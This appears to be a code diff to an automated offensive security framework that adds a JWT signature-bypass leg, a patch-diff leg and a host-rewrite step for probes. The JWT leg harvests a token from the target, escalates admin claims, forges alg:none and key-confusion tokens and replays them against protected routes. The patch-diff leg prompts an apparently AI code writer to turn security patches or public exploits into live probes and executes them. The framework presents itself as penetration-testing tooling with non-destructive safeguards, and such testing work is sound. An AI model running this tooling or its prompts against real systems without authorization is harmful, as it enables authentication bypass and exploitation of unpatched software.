@@ -536,6 +536,14 @@ def probe(move, ctx):
     Master kill-switch: AEGIS_NOVEL_CODE=0 disables execution (stages the code instead)."""
     code = move.get("code") or ""
     oracle_txt = move.get("oracle") or move.get("expected_oracle") or ""
+    # FORCE the probe to hit the ACTUAL target. The code bench routinely hardcodes the mirror default
+    # (localhost:8443) or a placeholder host regardless of the stated base; the curl path rebinds, but a
+    # PYTHON probe runs as-written and would hit the wrong host. Rewrite any absolute URL's scheme+host+port
+    # in the code to ctx base (path/query preserved), so both paths execute against the real target.
+    _pbase = (ctx or {}).get("base")
+    if _pbase and code and "://" in code:
+        import re as _re2
+        code = _re2.sub(r'https?://[A-Za-z0-9_.\-]+(?::\d+)?', _pbase.rstrip("/"), code)
     if os.environ.get("AEGIS_NOVEL_CODE", "1") == "0":
         return {"status": 0, "blocked": "novel-code execution disabled (AEGIS_NOVEL_CODE=0)",
                 "body": "[staged, not executed]", "probe": {"code": code[:400], "staged": True}}
@@ -2394,6 +2402,180 @@ def zap(move, ctx):
             "zap": {"scanned": scanned, "alerts": alerts, "mode": script}}
 
 
+def jwt_leg(move, ctx):
+    """JWT signature-bypass forgery (broken-auth class). RELEVANCY-GATED, not a blanket cannon: it only
+    does anything when the TARGET actually issued a JWT (lifted from the role session's bearer, or seen on a
+    whoami/profile surface). No JWT -> cheap n/a, never a false positive. When a JWT exists it forges the two
+    classic key-independent bypasses (alg:none always; RS256->HS256 only when a public key is known) with
+    ESCALATED claims, replays each against a PROTECTED route alongside a NO-TOKEN control, and the oracle
+    verifies ONLY the deterministic differential: forged token ACCEPTED (2xx) while the control is DENIED
+    (401/403). Non-destructive (a claim change + GETs). jingle-free; pure jwt_forge crafters do the minting."""
+    import json as _j, re as _re, requests
+    try:
+        import jwt_forge as _jf
+    except Exception as e:
+        return {"status": 200, "body": f"[jwt] jwt_forge unavailable: {e}",
+                "jwt": {"verdict": "n/a", "note": "crafter import failed"}, "jwt_verified": False}
+    base = (ctx or {}).get("base") or move.get("target") or os.environ.get("AEGIS_TARGET") or "https://localhost:8443"
+    base = base.rstrip("/")
+    sf = (ctx or {}).get("session_for_role")
+    role = move.get("role", "owner")
+    try:
+        s = sf(role) if sf else requests.Session()
+    except Exception:
+        s = requests.Session()
+    auth_hdr = os.environ.get("AEGIS_AUTH_HEADER", "Authorization")
+    _JWT = r'eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+'
+    # 1. RELEVANCY GATE: obtain a REAL JWT the target issued.
+    token = move.get("token")
+    if not token:
+        try:
+            m = _re.search(_JWT, s.headers.get(auth_hdr) or "")
+            if m:
+                token = m.group(0)
+        except Exception:
+            pass
+    if not token:
+        for pp in (move.get("surface"), move.get("path"), "/rest/user/whoami", "/api/me", "/profile", "/"):
+            if not pp:
+                continue
+            try:
+                r = s.get(base + "/" + str(pp).lstrip("/"), verify=False, timeout=12)
+                m = _re.search(_JWT, r.text or "")
+                if m:
+                    token = m.group(0)
+                    break
+            except Exception:
+                continue
+    if not token or not str(token).startswith("eyJ"):
+        return {"status": 200, "body": "[jwt] target issues no JWT on reachable surfaces -- not relevant (no cannon-fire)",
+                "jwt": {"verdict": "n/a", "note": "no JWT observed"}, "jwt_verified": False}
+    # 2. decode + build ESCALATED claims (non-destructive: a claim change only).
+    try:
+        _hdr, payload, _sig = _jf.decode_segments(token)
+    except Exception as e:
+        return {"status": 200, "body": f"[jwt] undecodable token: {e}",
+                "jwt": {"verdict": "rejected", "note": "decode failed"}, "jwt_verified": False}
+    esc = dict(payload) if isinstance(payload, dict) else {}
+    for k in list(esc.keys()):
+        if k.lower() in ("role", "roles", "isadmin", "is_admin", "admin", "scope", "authorities", "grp", "group", "type"):
+            esc[k] = True if isinstance(esc[k], bool) else "admin"
+    host = _re.sub(r'^https?://', '', base).split('/')[0].split(':')[0]
+    if isinstance(esc.get("data"), dict):                      # juice-shop shape: data.email / data.role
+        d = dict(esc["data"])
+        if "email" in d:
+            d["email"] = os.environ.get("AEGIS_ADMIN_EMAIL", "admin@" + host)
+        if "role" in d:
+            d["role"] = "admin"
+        if "isAdmin" in d:
+            d["isAdmin"] = True
+        esc["data"] = d
+    forgeries = _jf.craft_forgeries(esc, move.get("public_key_pem"))
+    # 3. PROTECTED route + no-token control -> deterministic differential.
+    route = move.get("verify_path") or move.get("surface") or move.get("path") or "/rest/admin/application-configuration"
+    url = base + "/" + str(route).lstrip("/")
+    try:
+        ctrl_status = requests.get(url, verify=False, timeout=12).status_code
+    except Exception:
+        ctrl_status = -1
+    attempts, verified, win = [], False, {}
+    for vector, ftok in forgeries:
+        try:
+            fr = requests.get(url, headers={auth_hdr: "Bearer " + ftok}, verify=False, timeout=12)
+            acc = 200 <= fr.status_code < 300
+            attempts.append({"vector": vector, "status": fr.status_code, "accepted": acc})
+            if acc and ctrl_status in (401, 403):
+                verified, win = True, {"vector": vector, "forged_status": fr.status_code, "control_status": ctrl_status}
+                break
+        except Exception as e:
+            attempts.append({"vector": vector, "error": str(e)[:80]})
+    # REACHABILITY: a real HTTP code on the control OR any forged attempt means the route answered; if every
+    # request errored (connection failure) the target is UNREACHABLE -> report status -1 so the reality/retest
+    # layer treats it as inconclusive, never a false 'public'/'fixed'.
+    reached = (ctrl_status not in (-1, None)) or any(isinstance(a.get("status"), int) for a in attempts)
+    rec = {"verdict": "verified" if verified else "rejected", "route": route, "control_status": ctrl_status,
+           "attempts": attempts, "forged_claims": {k: esc.get(k) for k in list(esc)[:6]}}
+    rec.update(win)
+    if not verified:
+        if not reached:
+            rec["note"] = "target unreachable (no HTTP response from route) -- inconclusive"
+        elif ctrl_status not in (401, 403):
+            rec["note"] = "control not denied (status %s) -- route is public, no bypass proven" % ctrl_status
+        else:
+            rec["note"] = "no forged token accepted"
+    return {"status": (200 if reached else -1), "body": _j.dumps(rec)[:2000], "jwt": rec, "jwt_verified": verified}
+
+
+def patch_diff_leg(move, ctx):
+    """GROUNDED n-day DEVELOPER (patch_differ ladder, was shelf-ware). For a fingerprinted component+version
+    it picks the rung -- public exploit / PATCH-DIFF / novel -- behind a fingerprint-TRUST gate (no blind
+    diffing of a poisoned/unconfirmed version), then GROUNDS the code bench with the REAL artifacts: the
+    security-relevant patch hunks (the fix reveals the bug) or the public PoC, so the probe is
+    reverse-engineered from the actual diff rather than guessed from a CVE id. Synthesizes via novel_code and
+    runs through the probe leg (its own probe_verified oracle). RELEVANCY: only a version'd component; the
+    trust gate + repo map keep it from blind-firing. Offline-safe (plan() degrades rung by rung)."""
+    import json as _j
+    component = (move.get("component") or move.get("target") or "").lower().strip()
+    version = str(move.get("version") or "").strip()
+    if not component or not version:
+        return {"status": 200, "body": "[patch_diff] no component+version -- not relevant",
+                "patch_diff": {"mode": "n/a", "note": "missing component/version"}}
+    base = (ctx or {}).get("base") or os.environ.get("AEGIS_TARGET") or ""
+    try:
+        import patch_differ as _pd
+    except Exception as e:
+        return {"status": -1, "body": f"[patch_diff] patch_differ unavailable: {e}",
+                "patch_diff": {"mode": "error"}}
+    try:
+        plan = _pd.plan(component, version, base_url=base or None,
+                        host_header=os.environ.get("AEGIS_HOST_HEADER"), confirm=bool(base))
+    except Exception as e:
+        return {"status": 200, "body": f"[patch_diff] plan failed: {e}",
+                "patch_diff": {"component": component, "version": version, "mode": "error"}}
+    mode = plan.get("mode")
+    if mode == "patch_diff":
+        hunks = plan.get("security_hunks") or []
+        hblob = "\n\n".join("// %s (signals: %s)\n%s" % (h.get("filename", ""), ",".join(h.get("signals", [])),
+                                                         h.get("hunk", "")) for h in hunks[:6])
+        brief = ("REVERSE-ENGINEER THE PATCH. Below are the SECURITY-relevant hunks of the fix that landed "
+                 "between the vulnerable and patched releases of %s %s -- the fix reveals the bug. Write ONE "
+                 "NON-DESTRUCTIVE probe (curl or python) that triggers the PRE-patch (vulnerable) behaviour on "
+                 "the live app, with an ORACLE that proves it. Base: %s.\nPATCH HUNKS:\n%s"
+                 % (component, version, base, hblob))
+    elif mode == "public_exploit":
+        brief = ("A public exploit targets %s %s (or newer): %s. ADAPT it into ONE NON-DESTRUCTIVE probe "
+                 "against %s with an ORACLE that proves exploitability without causing damage."
+                 % (component, version, _j.dumps(plan.get("public_exploits"))[:700], base))
+    else:                                                      # novel / behavioral
+        brief = ((plan.get("note") or "novel-code direction") +
+                 " Write ONE non-destructive probe (curl/python) against %s with a proving ORACLE." % base)
+    # LIVE ADVISORY RESEARCH (the approach is normally STATED publicly): prepend the advisory grounding so the
+    # bench develops from the publicly-stated approach + the diff, not a guess. Offline-safe (empty if offline/
+    # nothing relevant); authorized-OSINT lane, same gating as the RAG online refresh.
+    try:
+        import cve_research as _cr
+        _adv = _cr.grounding_brief(component, version)
+        if _adv:
+            brief = _adv + "\n\n" + brief
+            plan["advisories_used"] = True
+    except Exception:
+        pass
+    move2 = dict(move, new_code=brief, layer="code", action="probe",
+                 technique="patch_diff.%s" % component, vuln_class=move.get("vuln_class") or "n-day",
+                 why_novel="grounded %s probe for %s %s" % (mode, component, version))
+    try:
+        import novel_code
+        move2 = novel_code.make_code_writer()(move2, ctx) or move2    # fills move2["code"] from the code bench
+    except Exception as e:
+        return {"status": 200, "body": "[patch_diff] code-bench unavailable: %s" % str(e)[:120],
+                "patch_diff": {"component": component, "version": version, "mode": mode,
+                               "repo": plan.get("repo"), "note": (plan.get("note") or "")[:200]}}
+    res = probe(move2, ctx)                                    # run the written probe + its probe_verified oracle
+    res["patch_diff"] = {"component": component, "version": version, "mode": mode, "repo": plan.get("repo"),
+                         "hunks": len(plan.get("security_hunks") or []), "note": (plan.get("note") or "")[:200]}
+    return res
+
+
 LEGS = {"web": web, "fact": web, "authz": web, "money": web, "stateful": stateful, "differential": differential,
         "idor": idor, "rate": rate, "security_headers": security_headers, "session_fixation": session_fixation,
         "open_redirect": open_redirect, "mass_assign": mass_assign, "csrf": csrf, "ssrf": ssrf, "xss": xss, "file_upload": file_upload,
@@ -2401,7 +2583,9 @@ LEGS = {"web": web, "fact": web, "authz": web, "money": web, "stateful": statefu
         "zap": zap,
         "recon": recon, "supply_chain": supply_chain, "static": static,
         "fuzz": fuzz, "ossfuzz": ossfuzz, "nuclei": nuclei, "msf": msf, "misconfig": misconfig, "rag": rag,
-        "probe": probe, "code": probe}
+        "probe": probe, "code": probe,
+        "jwt": jwt_leg, "jwt_forge": jwt_leg, "broken_auth_jwt": jwt_leg,
+        "patch_diff": patch_diff_leg, "ndiff": patch_diff_leg, "n_day": patch_diff_leg}
 
 # DISCOVERY-PARITY legs (AD/LDAP, cloud, fingerprint, external-surface, cred-harvest, sbom) + the NOVEL
 # beyond-tooling techniques (rag_infer, authz_fuzz, depconf, honeypot, attackpath). Offline-safe: if the
